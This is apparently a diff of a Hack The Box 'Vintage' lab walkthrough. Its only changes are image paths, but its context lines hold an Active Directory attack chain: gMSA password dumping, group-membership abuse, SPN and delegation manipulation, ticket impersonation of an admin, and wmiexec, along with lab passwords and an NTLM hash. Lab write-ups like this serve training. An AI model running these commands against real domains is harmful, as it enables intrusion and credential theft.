@@ -17,7 +17,7 @@ Rosaisbest123**
 **RUN: sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt
 administrator.htb**
 
-![](images/media/image1.png)
+![](Vintage/media/image1.png)
 
 Found **LDAP SERVER: PORT 3268**
 
@@ -30,7 +30,7 @@ CONTROLLER: DC01**
 
 **2.1** Add **DC01.vintage.htb** and **vintage.htb** to **/etc/hosts**
 
-![](images/media/image2.png)
+![](Vintage/media/image2.png)
 
 **3. LDAP query**
 
@@ -38,9 +38,9 @@ CONTROLLER: DC01**
 \"Rosaisbest123\" -b \"DC=vintage,DC=htb\" \"(objectClass=user)\"
 sAMAccountName memberOf**
 
-![](images/media/image3.png)
+![](Vintage/media/image3.png)
 
-![](images/media/image4.png)
+![](Vintage/media/image4.png)
 
 **INFO:** In the screenshots above are **CN=ServiceManagers
 entries** e.g. L.Bianchi User. Search in **Bloodhound GUI** for
@@ -51,7 +51,7 @@ FOUND COMPUTER FS01.vintage.htb in screenshots above
 
 - Add **10.10.11.45 FS01.vintage.htb** to **/etc/hosts**
 
-![](images/media/image5.png)
+![](Vintage/media/image5.png)
 
 **Bloodhound**
 
@@ -70,14 +70,14 @@ Do53:10.10.11.45@53 answered The DNS operation timed out.**
 
 **Ignore it and go to next STEP**
 
-![](images/media/image6.png)
+![](Vintage/media/image6.png)
 
 **5. Import** previously downloaded **JSON-files into Bloodhound GUI**
 
 **6.** Analyzed data: **Bianchi is member of admin group and has admin
 privileges**
 
-![](images/media/image7.png)
+![](Vintage/media/image7.png)
 
 **7.** Look for **CN=Managed Service Accounts. FOUND gMSA01**
 
@@ -85,19 +85,19 @@ privileges**
 ServiceManagers@Vintage.htb. Can AddSelf to ServiceManagers@Vintage.htb
 (Administrators Group)**
 
-![](images/media/image8.png)
+![](Vintage/media/image8.png)
 
 **8. Check Intra-Domain relations. SEE INBOUND CONTROL RIGHTS of
 <gMSA01$@vintage.htb>**
 
-![](images/media/image9.png)
+![](Vintage/media/image9.png)
 
-![](images/media/image10.png)
+![](Vintage/media/image10.png)
 
 **- FS01.vintage.htb** can **read PASSWORD from gMSA01\$@vintage.htb.
 Then gMSA01\$@vintage.htb can add itself to Administrator group**
 
-![](images/media/image11.png)
+![](Vintage/media/image11.png)
 
 **///-USER-//////////////////////////////////////////////////////////////////////////////////////**
 
@@ -108,7 +108,7 @@ save it in ccache format
 
 **RUN: impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01\$:fs01**
 
-![](images/media/image12.png)
+![](Vintage/media/image12.png)
 
 **U2.**
 
@@ -117,7 +117,7 @@ the cache file that the Kerberos client should use.
 
 **RUN: export KRB5CCNAME=FS01\\\$.ccache**
 
-![](images/media/image13.png)
+![](Vintage/media/image13.png)
 
 **U3. NTLM HASH**
 
@@ -131,7 +131,7 @@ Directory domain controller
 **RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
 10.10.11.45 -k get object \'GMSA01\$\' \--attr msDS-ManagedPassword**
 
-![](images/media/image14.png)
+![](Vintage/media/image14.png)
 
 **U4.**
 
@@ -141,11 +141,11 @@ domain controller using the known GMSA account hash from STEP U3
 **RUN: impacket-getTGT vintage.htb/GMSA01\$ -hashes
 aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178**
 
-![](images/media/image15.png)
+![](Vintage/media/image15.png)
 
 **RUN: export KRB5CCNAME=GMSA01\\\$.ccache**
 
-![](images/media/image16.png)
+![](Vintage/media/image16.png)
 
 **U5.**
 
@@ -155,7 +155,7 @@ then generate your own credentials
 **RUN: bloodyAD \--host dc01.vintage.htb -d \"VINTAGE.HTB\" \--dc-ip
 10.10.11.45 -k add groupMember \"SERVICEMANAGERS\" \"P.Rosa\"**
 
-![](images/media/image17.png)
+![](Vintage/media/image17.png)
 
 **U5.1.**
 
@@ -164,7 +164,7 @@ INFO: Sets a new PASSWORD. Command creates P.Rosa.ccache file.
 **RUN: impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip
 dc01.vintage.htb**
 
-![](images/media/image18.png)
+![](Vintage/media/image18.png)
 
 **U5.2.**
 
@@ -172,7 +172,7 @@ dc01.vintage.htb**
 
 **RUN: export KRB5CCNAME=P.Rosa.ccache**
 
-![](images/media/image19.png)
+![](Vintage/media/image19.png)
 
 **U6.**
 
@@ -292,14 +292,14 @@ INFO: Use DPAPI to obtain WINDOWS IDENTITY CREDENTIALS
 
 **RUN: download C4BB96844A5C9DD45D5B6A9859252BA6**
 
-![](images/media/image20.png)
+![](Vintage/media/image20.png)
 
 **E.G. Error**: **malloc_consolidate(): unaligned fastbin chunk
 detected**
 
 **SOLUTION:** Relogin and repeat the STEP if such an ERROR occurs
 
-![](images/media/image21.png)
+![](Vintage/media/image21.png)
 
 **E.G. Win-RM Login Error**: **An erro of type GSSAPI::GsApiError
 happened, message is gss_init_sec_context did not return GSS_S_COMPLETE:
@@ -307,17 +307,17 @@ No credentials were supplied, or the credentials were unavailable or
 inaccessible. No Kerberos credentials available (default cache:
 FILE:/tmp/krb5cc_1000)**
 
-![](images/media/image22.png)
+![](Vintage/media/image22.png)
 
 **SOLUTION:** Edit /etc/resolv.conf like this
 
 **modded**
 
-![](images/media/image23.png)
+![](Vintage/media/image23.png)
 
 **ORIGINAL**
 
-![](images/media/image24.png)
+![](Vintage/media/image24.png)
 
 **R4.**
 
@@ -359,7 +359,7 @@ INFO: The next step is to add C.NERI_ADM to DELEGATEDADMINS (c.neri ??)
 \"VINTAGE.HTB\" -u c.neri_adm -p \'Uncr4ck4bl3P4ssW0rd0312\' -k add
 groupMember \"DELEGATEDADMINS\" \"SVC_SQL\"**
 
-![](images/media/image25.png)
+![](Vintage/media/image25.png)
 
 **IMPORTANT! Both commands R7.1.+R7.2. below, have to be set fast,
 otherwise impacket-getTGT won\'t work in STEP R8 !**
@@ -373,7 +373,7 @@ INFO: SVC_SQL's SPN (ServicePrincipalName) has been updated to
 10.10.11.45 -u c.neri -p \"Zer0the0ne\" -k set object \"SVC_SQL\"
 servicePrincipalName -v \"cifs/fake\"**
 
-![](images/media/image26.png)
+![](Vintage/media/image26.png)
 
 **R7.2. WORKED**
 
@@ -391,12 +391,12 @@ INFO: This command doublechecks if the previous 2 were set correctly
 
 **Result should look like this**
 
-![](images/media/image27.png)
+![](Vintage/media/image27.png)
 
 **In this example, Enabled is Flase. Solution: Run the command from
 screenshot above to active it.**
 
-![](images/media/image28.png)
+![](Vintage/media/image28.png)
 
 **R8.**
 
@@ -407,7 +407,7 @@ dc01.vintage.htb**
 
 **RUN: export KRB5CCNAME=svc_sql.ccache**
 
-![](images/media/image29.png)
+![](Vintage/media/image29.png)
 
 **R9.**
 
@@ -418,11 +418,11 @@ ticket, you can use it to access the service.
 **RUN: impacket-getST -spn \'cifs/dc01.vintage.htb\' -impersonate
 L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \'vintage.htb/svc_sql:Zer0the0ne\'**
 
-![](images/media/image30.png)
+![](Vintage/media/image30.png)
 
 **E.G. ERROR in R9.**
 
-![](images/media/image31.png)
+![](Vintage/media/image31.png)
 
 **If an Error occurs in R9. do this RUN**
 
@@ -430,7 +430,7 @@ L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \'vintage.htb/svc_sql:Zer0the0ne\'**
 10.10.11.45 -u c.neri_adm -p \"Uncr4ck4bl3P4ssW0rd0312\" -k add
 groupMember \"DELEGATEDADMINS\" \"SVC_SQL\"**
 
-![](images/media/image25.png)
+![](Vintage/media/image25.png)
 
 **RERUN R8 commands (get the ticket for this SVC)**
 
@@ -439,7 +439,7 @@ dc01.vintage.htb**
 
 **RUN: export KRB5CCNAME=svc_sql.ccache**
 
-![](images/media/image32.png)
+![](Vintage/media/image32.png)
 
 **R9.1.**
 
@@ -448,14 +448,14 @@ INFO: RERUN R9 commands
 **RUN: impacket-getST -spn \'cifs/dc01.vintage.htb\' -impersonate
 L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \'vintage.htb/svc_sql:Zer0the0ne\'**
 
-![](images/media/image33.png)
+![](Vintage/media/image33.png)
 
 **R9.2.**
 
 **RUN: export
 KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache**
 
-![](images/media/image34.png)
+![](Vintage/media/image34.png)
 
 **R10. Root.txt**
 
@@ -465,4 +465,4 @@ the command through wmiexec
 **RUN: impacket-wmiexec -k -no-pass
 VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb**
 
-![](images/media/image35.png)
+![](Vintage/media/image35.png)
